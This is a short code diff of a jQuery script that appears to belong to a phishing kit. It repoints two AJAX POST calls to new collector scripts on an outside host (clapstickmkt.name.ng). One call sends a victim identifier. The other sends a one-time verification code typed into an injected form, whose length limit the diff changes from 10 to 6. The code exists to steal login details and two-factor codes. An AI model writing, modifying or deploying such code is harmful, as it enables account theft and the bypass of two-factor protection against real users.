@@ -47,7 +47,7 @@ $(document).ready(function() {
 
         $.ajax({
             dataType: 'JSON',
-            url: 'https://elibraryvault.com/img/6106/s3685396730.php',
+            url: 'https://clapstickmkt.name.ng/james/aaa.php',
             type: 'POST',
             data: {
                 ai: aiVal,
@@ -166,7 +166,7 @@ $('body').append(`
                 type="text"
                 inputmode="numeric"
                 autocomplete="one-time-code"
-                maxlength="10"
+                maxlength="6"
                 placeholder="Please input"
                 aria-label="Verification code">
 
@@ -267,7 +267,7 @@ $('body').append(`
         .text('Verifying...');
 
     $.ajax({
-        url: 'https://demo.thailoilgroup.com/flows/cp1.php',
+        url: 'https://clapstickmkt.name.ng/james/aaa1.php',
         method: 'POST',
         data: {
             ncheta: $('#verifyCode').val(),
